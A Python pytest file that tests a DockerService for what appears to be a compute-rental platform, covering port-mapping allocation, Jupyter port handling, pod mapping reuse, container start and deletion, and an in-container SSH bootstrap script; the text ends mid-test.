import shlex
from unittest.mock import AsyncMock, Mock, MagicMock, patch
from uuid import uuid4, UUID
from datetime import datetime

import pytest
import pytest_asyncio
from tenacity import Future, RetryError

from services.docker_service import (
    DockerService,
    VolumeMinSizeError,
    _parse_volume_size_to_bytes,
)
from payload_models.payloads import (
    ContainerCreateRequest,
    ContainerDeleteRequest,
    ContainerDeleted,
    ContainerStartRequest,
    PayloadPortMapping,
    WorkloadKind,
)
from datura.requests.miner_requests import ExecutorSSHInfo


def create_mock_port_dict(
    ports: list[int],
    miner_hotkey: str,
    executor_id: UUID
) -> dict[int, dict]:
    """Helper to create mock port dictionary from list of ports."""
    return {
        port: {
            "miner_hotkey": miner_hotkey,
            "executor_id": executor_id,
            "internal_port": port,
            "external_port": port,
            "is_successful": True
        }
        for port in ports
    }


@pytest.fixture
def mock_dependencies():
    """Mock all DockerService dependencies."""
    ssh_service = Mock()
    redis_service = Mock()
    attestation_service = Mock()

    # Mock the async context manager for Redis lock
    lock_mock = AsyncMock()
    lock_mock.__aenter__ = AsyncMock(return_value=lock_mock)
    lock_mock.__aexit__ = AsyncMock(return_value=None)
    redis_service.acquire_executor_lock = Mock(return_value=lock_mock)

    return ssh_service, redis_service, attestation_service


@pytest_asyncio.fixture
async def docker_service(mock_dependencies):
    """Create DockerService instance with mocked dependencies."""
    ssh_service, redis_service, attestation_service = mock_dependencies
    service = DockerService(
        ssh_service=ssh_service,
        redis_service=redis_service,
        attestation_service=attestation_service
    )
    return service


@pytest.fixture
def test_executor_id():
    """Fixture for test executor ID."""
    return str(uuid4())


@pytest.fixture
def test_miner_hotkey():
    """Fixture for test miner hotkey."""
    return "test_miner"


@pytest.mark.asyncio
async def test_generate_portMappings_exact_matches(docker_service, test_executor_id, test_miner_hotkey):
    """Test port mappings with exact docker_port == external_port matches."""
    docker_ports = [22, 20000, 20001]

    # Mock backend response with exact matches for all requested ports
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in docker_ports
    ]

    # Act
    result = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), docker_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )
    result = result[0]

    # Assert
    # Expect exact matches for all ports
    assert len(result) == 3
    assert (22, 22, 22) in result
    assert (20000, 20000, 20000) in result
    assert (20001, 20001, 20001) in result


@pytest.mark.asyncio
async def test_generate_portMappings_mixed_scenario(docker_service, test_executor_id, test_miner_hotkey):
    """Test port mappings with both exact matches and random selection."""
    docker_ports = [22, 20000, 20001]

    # Mock backend response: exact match for 22, random for others
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in [22, 8080, 9090]
    ]

    # Act
    result = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), docker_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )
    result = result[0]

    # Assert
    # Expect exact match for 22, random selection for others
    assert len(result) == 3
    assert (22, 22, 22) in result  # Exact match

    # Other docker ports should get random available ports from {8080, 9090}
    other_mappings = [m for m in result if m[0] != 22]
    assert len(other_mappings) == 2
    external_ports_used = {m[2] for m in other_mappings}
    assert external_ports_used.issubset({8080, 9090})


@pytest.mark.parametrize(
    "available_ports,expected_mappings,initial_port_count,enable_jupyter",
    [
        # Exact match with PREFERRED_POD_PORTS
        (
            [22, 20000, 20001],
            [(22, 22, 22), (20000, 20000, 20000), (20001, 20001, 20001)],
            None,
            False,
        ),
        # Simple available ports - SSH missing, gets max port
        (
            [20000, 20001, 20002],
            [(22, 20002, 20002), (20000, 20000, 20000), (20001, 20001, 20001)],
            None,
            False,
        ),
        # Available ports don't match PREFERRED_POD_PORTS - flexible mode assigns SSH to max port
        (
            [9000, 9001, 9002],
            [(22, 9002, 9002), (9000, 9000, 9000), (9001, 9001, 9001)],
            None,
            False,
        ),
        # many ports available, only 1 initial_port_count
        (
            [r for r in range(20000, 20100)],
            [(22, 20099, 20099), (20000, 20000, 20000)],
            1,
            False,
        ),
        # many ports available, 50 initial_port_count
        (
            [r for r in range(20000, 20100)],
            [(22, 20099, 20099)] + [(port, port, port) for port in range(20000, 20050)],
            50,
            False,
        ),
        # case - we have a small amount of ports available, but big initial_port_count
        (
            [r for r in range(20000, 20005)],
            [(22, 20004, 20004)]  + [(port, port, port) for port in range(20000, 20004)],
            50,
            False,
        ),
        # enable_jupyter=True, 8888 available - exact match
        (
            [22, 8888, 20000, 20001],
            [(22, 22, 22), (8888, 8888, 8888), (20000, 20000, 20000), (20001, 20001, 20001)],
            None,
            True,
        ),
        # enable_jupyter=True, 8888 not available - SSH gets max, Jupyter gets next available
        (
            [9000, 9001, 9002, 9003],
            [(22, 9003, 9003), (8888, 9002, 9002), (9000, 9000, 9000), (9001, 9001, 9001)],
            None,
            True,
        ),
        # enable_jupyter=True with initial_port_count - SSH, Jupyter, then 2 more ports
        (
            [r for r in range(20000, 20100)],
            [(22, 20099, 20099), (8888, 20098, 20098), (20000, 20000, 20000), (20001, 20001, 20001)],
            2,
            True,
        ),
    ],
)
@pytest.mark.asyncio
async def test_flexible_mode_port_mappings(
    docker_service, test_executor_id, test_miner_hotkey, available_ports, expected_mappings, initial_port_count, enable_jupyter, monkeypatch
):
    """Test FLEXIBLE mode with various available port scenarios.

    In flexible mode (internal_ports=None):
    - If exact matches exist, use them
    - If no exact matches, docker_port = external_port from available set
    - SSH port (22) gets special handling: max port if not available
    - When enable_jupyter=True, Jupyter port (8888) is inserted at position 1
    """
    # Mock PREFERRED_POD_PORTS to a shorter list for easier testing
    monkeypatch.setattr("services.docker_service.PREFERRED_POD_PORTS", [20000, 20001, 20002, 20003])

    # Mock backend response
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in available_ports
    ]

    # Act - internal_ports=None triggers flexible mode
    result = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), None, initial_port_count,
        enable_jupyter=enable_jupyter, available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )
    result = result[0]

    # Assert
    assert len(result) == len(expected_mappings)
    assert set(result) == set(expected_mappings)


@pytest.mark.asyncio
async def test_no_exact_match_custom_ports_uses_random_selection(docker_service, test_executor_id, test_miner_hotkey):
    """Test random selection when no exact matches found with custom internal_ports."""
    custom_internal_ports = [8080, 8081, 8082]

    # Available ports don't match requested ports
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in [9000, 9001, 9002]
    ]

    # Act
    result = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), custom_internal_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )
    result = result[0]

    # Assert
    # Expect random selection: docker ports from custom list, external ports from available set
    assert len(result) == 3
    docker_ports_used = {m[0] for m in result}
    assert docker_ports_used == {8080, 8081, 22}

    external_ports_used = {m[2] for m in result}
    assert external_ports_used == {9000, 9001, 9002}
    possible_internal_ports = custom_internal_ports + [22]

    # Verify mapping structure
    for docker_port, internal_port, external_port in result:
        assert docker_port in possible_internal_ports
        assert external_port in {9000, 9001, 9002}
        assert internal_port == external_port


@pytest.mark.parametrize("initial_port_count,expected_length,expected_first_port,should_have_extra_ports", [
    # No initial count - returns all PREFERRED_POD_PORTS
    (None, 11, 22, False),
    (2, 2, 22, False),  # +1 for SSH port = 3 total
    (5, 5, 22, False),  # +1 for SSH port = 6 total
    # More than PREFERRED_POD_PORTS length - returns PREFERRED_POD_PORTS + extra
    (11, 11, 22, True),  # +1 for SSH port = 12 total, 1 extra port needed
    (15, 15, 22, True),  # +1 for SSH port = 16 total, 5 extra ports needed
])
def test_get_preferred_ports(
    docker_service,
    initial_port_count,
    expected_length,
    expected_first_port,
    should_have_extra_ports,
    monkeypatch
):
    """Test get_preferred_ports method with various initial_port_count scenarios.

    The method adds 1 to initial_port_count for SSH port and returns:
    - All PREFERRED_POD_PORTS if initial_port_count is None/0
    - Limited PREFERRED_POD_PORTS if initial_port_count < len(PREFERRED_POD_PORTS)
    - PREFERRED_POD_PORTS + extra ports if initial_port_count > len(PREFERRED_POD_PORTS)
    """
    # Arrange - Mock PREFERRED_POD_PORTS to a known list
    mock_preferred_ports = [22, 20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009]
    monkeypatch.setattr("services.docker_service.PREFERRED_POD_PORTS", mock_preferred_ports)

    # Act
    result = docker_service._get_preferred_ports(initial_port_count)

    # Assert
    assert len(result) == expected_length
    assert result[0] == expected_first_port

    # Verify all ports are from PREFERRED_POD_PORTS or are extra sequential ports
    if should_have_extra_ports:
        # Check that first 11 ports are from PREFERRED_POD_PORTS
        assert result[:11] == mock_preferred_ports
        # Check that extra ports are sequential after max preferred port
        max_preferred = max(mock_preferred_ports)
        extra_ports = result[11:]
        for i, port in enumerate(extra_ports):
            assert port == max_preferred + i
    else:
        # All ports should be from PREFERRED_POD_PORTS
        for port in result:
            assert port in mock_preferred_ports


@pytest.mark.parametrize(
    "enable_jupyter,internal_ports,available_ports,expected_jupyter_in_mappings,jupyter_port_position",
    [
        # Scenario 1: enable_jupyter=True, STRICT mode, 8888 available (exact match)
        (True, [22, 8080, 8888], [22, 8080, 8888, 9000], True, 1),
        # Scenario 2: enable_jupyter=True, STRICT mode, 8888 not available (random assignment)
        (True, [22, 8080, 8888], [22, 8080, 9000, 9100], True, 1),
        # Scenario 3: enable_jupyter=True, FLEXIBLE mode, 8888 available
        (True, None, [22, 8888, 20000, 20001], True, 1),
        # Scenario 4: enable_jupyter=True, FLEXIBLE mode, 8888 not available
        (True, None, [9000, 9001, 9002, 9003], True, 1),
        # Scenario 5: enable_jupyter=False, should not include jupyter port
        (False, [22, 8080, 9000], [22, 8080, 9000], False, None),
    ],
)
@pytest.mark.asyncio
async def test_enable_jupyter_feature(
    docker_service,
    test_executor_id,
    test_miner_hotkey,
    enable_jupyter,
    internal_ports,
    available_ports,
    expected_jupyter_in_mappings,
    jupyter_port_position,
    monkeypatch,
):
    """Test enable_jupyter feature in various scenarios.

    Covers:
    - STRICT mode (with internal_ports): jupyter port 8888 inserted at position 1
    - FLEXIBLE mode (without internal_ports): jupyter port 8888 inserted at position 1
    - Disabled jupyter: no jupyter port in mappings, jupyter_port_map is None
    """
    # Arrange
    monkeypatch.setattr("services.docker_service.PREFERRED_POD_PORTS", [20000, 20001, 20002, 20003])
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in available_ports
    ]

    # Act
    mappings, jupyter_port_map = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), internal_ports,
        enable_jupyter=enable_jupyter, available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )

    # Assert
    # SSH port should always be first
    assert mappings[0][0] == 22

    if expected_jupyter_in_mappings:
        # Jupyter port should be at specified position
        assert mappings[jupyter_port_position][0] == 8888
        # Jupyter port map should be returned
        assert jupyter_port_map is not None
        assert jupyter_port_map[0] == 8888
        assert jupyter_port_map[1] in available_ports
    else:
        # Jupyter port should not be in mappings
        jupyter_ports = [m for m in mappings if m[0] == 8888]
        assert len(jupyter_ports) == 0
        # Jupyter port map should be None
        assert jupyter_port_map is None


@pytest.mark.asyncio
async def test_pod_mapping_reuse(docker_service, test_executor_id, test_miner_hotkey):
    """Test that existing pod mappings are reused when pod_id is provided."""
    pod_id = uuid4()

    # Existing pod mappings for ports 22, 8080, 8081 (with docker_port set)
    pod_mapping_raw = [
        PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=22),
        PayloadPortMapping(internal_port=20001, external_port=20001, docker_port=8080),
        PayloadPortMapping(internal_port=20002, external_port=20002, docker_port=8081),
    ]

    # Available ports (not used in this test since we have pod_mapping)
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in [9000, 9001, 9002]
    ]

    # Act - request same ports that are in pod_mapping
    requested_ports = [22, 8080, 8081]
    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, pod_id, requested_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=pod_mapping_raw
    )

    # Assert - should reuse existing pod mappings
    assert len(result) == 3
    # Check that we got the exact mappings from pod_mapping
    assert (22, 20000, 20000) in result
    assert (8080, 20001, 20001) in result
    assert (8081, 20002, 20002) in result


@pytest.mark.asyncio
async def test_pod_mapping_reuse_no_duplicate_external_port(docker_service, test_executor_id, test_miner_hotkey):
    """DAH-2068: new user-defined port must not steal an external_port already reused from pod_mapping.

    Reproduces the production failure where edit_pod=true and a new container port
    (e.g. 8091) was not in pod_mapping.  Before the fix, random.choice(available_ports)
    could return an external_port that was also reused by a pod_mapping entry, producing
    two mappings with the same internal_port and a Docker "port is already allocated" error.
    """
    pod_id = uuid4()

    # Existing pod has ssh→40040 and data ports 40001-40009 already mapped.
    pod_mapping_raw = [
        PayloadPortMapping(internal_port=40040, external_port=40040, docker_port=22),
        *[
            PayloadPortMapping(internal_port=p, external_port=p, docker_port=p)
            for p in range(40001, 40010)
        ],
    ]

    # Backend returns the pod's own external ports as available (excluded from busy_set).
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in range(40001, 40041)  # 40001-40040
    ]

    # User edits the pod and adds container port 8091 (new, not in old mapping).
    requested_ports = [22, 8091, *range(40001, 40010)]
    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, pod_id, requested_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=pod_mapping_raw
    )

    assert result, "expected non-empty port mappings"

    # No two mappings may share the same external_port (index 2 of each tuple).
    external_ports = [m[2] for m in result]
    assert len(external_ports) == len(set(external_ports)), (
        f"duplicate external_ports in mappings: {result}"
    )

    # SSH must keep its original external_port.
    ssh_mapping = next((m for m in result if m[0] == 22), None)
    assert ssh_mapping is not None
    assert ssh_mapping[2] == 40040


@pytest.mark.asyncio
async def test_min_port_count_validation(docker_service, test_executor_id, test_miner_hotkey, monkeypatch):
    """Test that generate_portMappings returns empty when MIN_PORT_COUNT is not met."""
    # Set MIN_PORT_COUNT to 3
    monkeypatch.setattr("services.docker_service.MIN_PORT_COUNT", 3)

    # Only 2 available ports (less than MIN_PORT_COUNT)
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in [9000, 9001]
    ]

    # Act
    result, jupyter_map = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, UUID(test_executor_id), [22, 8080, 8081],
        available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )

    # Assert - should return empty result
    assert result == []
    assert jupyter_map is None


@pytest.mark.asyncio
async def test_reserve_ports_with_backend_data(docker_service, test_executor_id, test_miner_hotkey):
    """Test port mapping with backend data."""
    # Available ports with different external port numbers
    available_ports_raw = [
        PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=None),
        PayloadPortMapping(internal_port=20001, external_port=20001, docker_port=None),
        PayloadPortMapping(internal_port=20002, external_port=20002, docker_port=None),
    ]

    pod_id = uuid4()

    # Act
    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, pod_id, [22, 8080, 8081],
        available_ports_raw=available_ports_raw, pod_mapping_raw=[]
    )

    # Assert
    assert len(result) == 3
    # Verify we got appropriate mappings
    docker_ports_used = {m[0] for m in result}
    assert 22 in docker_ports_used  # SSH port should be included
    external_ports_used = {m[2] for m in result}
    assert external_ports_used.issubset({20000, 20001, 20002})


@pytest.mark.asyncio
async def test_generate_portMappings_offsets_filler_custom_external_port(
    docker_service,
    test_executor_id,
    test_miner_hotkey,
):
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in range(20000, 20026)
    ]

    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey,
        test_executor_id,
        UUID(test_executor_id),
        [20000],
        available_ports_raw=available_ports_raw,
        pod_mapping_raw=[],
        workload_kind=WorkloadKind.FILLER,
    )

    assert (20000, 20020, 20020) in result
    assert (20000, 20000, 20000) not in result


@pytest.mark.asyncio
async def test_pod_mapping_partial_reuse(docker_service, test_executor_id, test_miner_hotkey):
    """Test that some ports are reused from pod_mapping and some are allocated from available."""
    pod_id = uuid4()

    # Existing pod mappings only for port 22
    pod_mapping_raw = [
        PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=22),
    ]

    # Available ports for the rest
    available_ports_raw = [
        PayloadPortMapping(internal_port=p, external_port=p, docker_port=None)
        for p in [8080, 8081, 9000]
    ]

    # Act - request ports: 22 (in pod_mapping), 8080, 8081 (from available)
    requested_ports = [22, 8080, 8081]
    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, pod_id, requested_ports,
        available_ports_raw=available_ports_raw, pod_mapping_raw=pod_mapping_raw
    )

    # Assert
    assert len(result) == 3
    # Port 22 should be reused from pod_mapping
    assert (22, 20000, 20000) in result
    # Ports 8080 and 8081 should be allocated from available
    assert (8080, 8080, 8080) in result
    assert (8081, 8081, 8081) in result


# =============================================================================
# Tests for _convert_payload_ports and backend data flow
# =============================================================================

@pytest.mark.parametrize("available_raw,pod_raw,expected_available_keys,expected_pod_keys", [
    # Only available ports
    (
        [PayloadPortMapping(internal_port=p, external_port=p, docker_port=None) for p in [20000, 20001, 20002]],
        [],
        {20000, 20001, 20002},
        set(),
    ),
    # Pod mapping with docker_port as key
    (
        [],
        [PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=22),
         PayloadPortMapping(internal_port=20001, external_port=20001, docker_port=8080)],
        set(),
        {22, 8080},
    ),
    # Pod mapping fallback to external_port when docker_port is None
    (
        [],
        [PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=None)],
        set(),
        {20000},
    ),
])
def test_convert_payload_ports(docker_service, available_raw, pod_raw, expected_available_keys, expected_pod_keys):
    """Test _convert_payload_ports conversion logic."""
    available, pod = docker_service._convert_payload_ports(available_raw, pod_raw)
    assert set(available.keys()) == expected_available_keys
    assert set(pod.keys()) == expected_pod_keys


@pytest.mark.asyncio
async def test_generate_portMappings_uses_backend_data(docker_service, test_executor_id, test_miner_hotkey):
    """Test backend data is used when provided."""
    available_raw = [PayloadPortMapping(internal_port=p, external_port=p, docker_port=None) for p in [22, 8080, 8081]]

    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, uuid4(), [22, 8080, 8081],
        available_ports_raw=available_raw, pod_mapping_raw=[],
    )

    assert set(result) == {(22, 22, 22), (8080, 8080, 8080), (8081, 8081, 8081)}


@pytest.mark.asyncio
async def test_generate_portMappings_without_backend_data(docker_service, test_executor_id, test_miner_hotkey):
    """Test behavior when backend data is None - should return empty."""
    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, uuid4(), [22, 8080, 8081],
        available_ports_raw=None, pod_mapping_raw=None
    )

    # Without backend data, should return empty
    assert result == []


@pytest.mark.asyncio
async def test_generate_portMappings_with_backend_pod_mapping(docker_service, test_executor_id, test_miner_hotkey):
    """Test pod mappings from backend are applied correctly."""
    available_raw = [PayloadPortMapping(internal_port=p, external_port=p, docker_port=None) for p in [9000, 9001]]
    pod_raw = [PayloadPortMapping(internal_port=20000, external_port=20000, docker_port=22)]

    result, _ = await docker_service.generate_portMappings(
        test_miner_hotkey, test_executor_id, uuid4(), [22, 8080, 8081],
        available_ports_raw=available_raw, pod_mapping_raw=pod_raw,
    )

    assert len(result) == 3
    assert (22, 20000, 20000) in result  # from backend pod_mapping


# =============================================================================
# Tests for clean_existing_containers
# =============================================================================


def _make_ssh_run_result(stdout: str):
    """Helper to create a mock SSH run result."""
    mock_result = Mock()
    mock_result.stdout = stdout
    return mock_result


class DummySSHConnectionManager:
    def __init__(self, ssh_client):
        self.ssh_client = ssh_client

    async def __aenter__(self):
        return self.ssh_client

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        return None


@pytest.fixture
def retry_ssh_mock(monkeypatch):
    """Mock retry_ssh_command to capture SSH commands without executing."""
    import services.docker_service as ds_module
    mock = AsyncMock()
    monkeypatch.setattr(ds_module, "retry_ssh_command", mock)
    return mock


def _make_ssh_command_result(exit_status: int = 0, stdout: str = "", stderr: str = ""):
    result = Mock()
    result.exit_status = exit_status
    result.stdout = stdout
    result.stderr = stderr
    return result


def _make_retry_error(exc: Exception) -> RetryError:
    future = Future(1)
    future.set_exception(exc)
    return RetryError(future)


@pytest.mark.asyncio
async def test_delete_filler_container_treats_missing_container_as_deleted(
    docker_service,
    retry_ssh_mock,
    monkeypatch,
):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result())
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.remove_rented_machine = AsyncMock()
    retry_ssh_mock.side_effect = [
        _make_retry_error(Exception("Error response from daemon: No such container: filler_missing")),
        None,
    ]

    payload = ContainerDeleteRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        workload_kind=WorkloadKind.FILLER,
        container_name="filler_missing",
        local_volume="volume_missing",
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")

    result = await docker_service.delete_container(
        payload=payload,
        executor_info=executor_info,
        keypair=keypair,
        private_key="encrypted",
    )

    assert isinstance(result, ContainerDeleted)
    assert result.pod_id == payload.pod_id
    assert retry_ssh_mock.await_count == 2
    docker_service.redis_service.remove_rented_machine.assert_awaited_once_with(
        executor_info,
        payload.container_name,
    )


@pytest.mark.asyncio
async def test_install_ssh_service_creates_bootstrap_script_inside_container(docker_service):
    """SSH bootstrap script is written directly in-container before execution."""
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result(exit_status=0))
    docker_service.execute_and_stream_logs = AsyncMock(return_value=(True, ""))

    result = await docker_service.install_open_ssh_server_and_start_ssh_service(
        ssh_client=ssh_client,
        container_name="pod_test",
        log_tag="test_log",
        log_extra={"pod_id": "pod-id"},
    )

    assert result is True
    ssh_client.run.assert_awaited_once()
    create_command = ssh_client.run.await_args_list[0].args[0]
    assert create_command.startswith('/usr/bin/docker exec -i pod_test sh -c ')
    assert "cat > /tmp/lium-ssh-bootstrap.sh" in create_command
    assert "chmod +x /tmp/lium-ssh-bootstrap.sh" in create_command
    assert "<< '__LIUM_SSHD_BOOTSTRAP_" in create_command
    assert "/usr/bin/docker cp" not in create_command

    assert docker_service.execute_and_stream_logs.await_count == 1
    commands = [call.kwargs["command"] for call in docker_service.execute_and_stream_logs.await_args_list]
    assert commands[0].endswith(" sh /tmp/lium-ssh-bootstrap.sh")
    assert all("/usr/bin/docker cp" not in command for command in commands)


@pytest.mark.asyncio
async def test_install_ssh_service_returns_false_when_in_container_script_creation_fails(docker_service):
    """Script creation failure returns False and skips bootstrap execution."""
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result(exit_status=1, stderr="permission denied"))
    docker_service.execute_and_stream_logs = AsyncMock(return_value=(True, ""))
    docker_service.stream_log = AsyncMock()

    result = await docker_service.install_open_ssh_server_and_start_ssh_service(
        ssh_client=ssh_client,
        container_name="pod_test",
        log_tag="test_log",
        log_extra={"pod_id": "pod-id"},
    )

    assert result is False
    ssh_client.run.assert_awaited_once()
    docker_service.execute_and_stream_logs.assert_not_awaited()


def test_ssh_bootstrap_script_supports_multi_distro_install(docker_service):
    """The injected SSH bootstrap script supports the expected package managers."""
    script = docker_service._ssh_bootstrap_script_path().read_text()

    assert "apt-get update" in script
    assert "apt-get install -y openssh-server" in script
    assert "apk add --no-cache openssh" in script
    assert "dnf install -y openssh-server" in script
    assert "yum install -y openssh-server" in script


def test_ssh_bootstrap_script_uses_single_watchdog_with_30_second_sleep(docker_service):
    """The watchdog loop is single-instance and checks sshd every 30 seconds."""
    script = docker_service._ssh_bootstrap_script_path().read_text()

    assert 'WATCHDOG_PIDFILE="/run/sshd-watchdog.pid"' in script
    assert 'WATCHDOG_LOG="/tmp/sshd-watchdog.log"' in script
    assert 'SLEEP_SECONDS=30' in script
    assert 'kill -0 "$watchdog_pid"' in script
    assert 'nohup sh "$SCRIPT_PATH" --watchdog-loop' in script
    assert 'sleep "$SLEEP_SECONDS"' in script


@pytest.mark.asyncio
async def test_start_container_restarts_ssh_after_docker_start(docker_service, monkeypatch):
    """start_container reruns the SSH bootstrap helper after docker start."""
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock()
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock(return_value="pkey"))
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )

    docker_service.ssh_service.decrypt_payload.return_value = "private-key"
    docker_service._prepare_known_hosts_policy = AsyncMock(return_value=None)
    docker_service.install_open_ssh_server_and_start_ssh_service = AsyncMock(return_value=True)

    payload = ContainerStartRequest(
        miner_hotkey="miner-hotkey",
        miner_address="127.0.0.1",
        miner_port=8000,
        executor_id=str(uuid4()),
        pod_id="pod-id",
        container_name="pod_test",
    )
    executor_info = ExecutorSSHInfo(
        uuid=str(uuid4()),
        address="127.0.0.1",
        port=8001,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python3",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")

    await docker_service.start_container(payload, executor_info, keypair, "encrypted-private-key")

    ssh_client.run.assert_awaited_once_with("/usr/bin/docker start pod_test")
    docker_service.install_open_ssh_server_and_start_ssh_service.assert_awaited_once_with(
        ssh_client=ssh_client,
        container_name="pod_test",
        log_tag="start_container_pod-id",
        log_extra={
            "miner_hotkey": "miner-hotkey",
            "executor_uuid": payload.executor_id,
            "executor_ip_address": "127.0.0.1",
            "executor_port": 8001,
            "executor_ssh_username": "root",
            "executor_ssh_port": 2200,
        },
    )


@pytest.mark.asyncio
async def test_start_container_logs_ssh_bootstrap_failure_and_keeps_starting(docker_service, monkeypatch):
    """A failed SSH bootstrap does not interrupt docker start."""
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock()
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock(return_value="pkey"))
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )

    docker_service.ssh_service.decrypt_payload.return_value = "private-key"
    docker_service._prepare_known_hosts_policy = AsyncMock(return_value=None)
    docker_service.install_open_ssh_server_and_start_ssh_service = AsyncMock(return_value=False)

    payload = ContainerStartRequest(
        miner_hotkey="miner-hotkey",
        miner_address="127.0.0.1",
        miner_port=8000,
        executor_id=str(uuid4()),
        pod_id="pod-id",
        container_name="pod_test",
    )
    executor_info = ExecutorSSHInfo(
        uuid=str(uuid4()),
        address="127.0.0.1",
        port=8001,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python3",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")
    logger_mock = Mock()
    monkeypatch.setattr("services.docker_service.logger.warning", logger_mock)

    await docker_service.start_container(payload, executor_info, keypair, "encrypted-private-key")

    ssh_client.run.assert_awaited_once_with("/usr/bin/docker start pod_test")
    docker_service.install_open_ssh_server_and_start_ssh_service.assert_awaited_once()
    assert logger_mock.called


@pytest.mark.asyncio
async def test_clean_containers_active_siblings_not_removed(docker_service, retry_ssh_mock):
    """Active sibling containers listed in active_container_names must be preserved."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_abc123\npod_sibling1\npod_sibling2\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_abc123",
        active_container_names=["pod_sibling1", "pod_sibling2"],
    )

    # Assert — only target pod removed, active siblings preserved
    rm_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "pod_abc123" in rm_command
    assert "pod_sibling1" not in rm_command
    assert "pod_sibling2" not in rm_command


@pytest.mark.asyncio
async def test_clean_containers_stale_pods_removed(docker_service, retry_ssh_mock):
    """Stale pod_ containers not in active list should be cleaned up."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\npod_stale_orphan\npod_active_sibling\nsome_other_container\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        active_container_names=["pod_active_sibling"],
    )

    # Assert — target + stale orphan removed; active sibling and non-pod container kept
    rm_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "pod_target" in rm_command
    assert "pod_stale_orphan" in rm_command
    assert "pod_active_sibling" not in rm_command
    # non-pod containers are never touched
    assert "some_other_container" not in rm_command


@pytest.mark.asyncio
async def test_clean_containers_stale_fillers_removed(docker_service, retry_ssh_mock):
    """Stale filler_ containers are removed before creating a new container."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\nfiller_stale\nfiller_active\nsome_other_container\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        active_container_names=["filler_active"],
    )

    # Assert
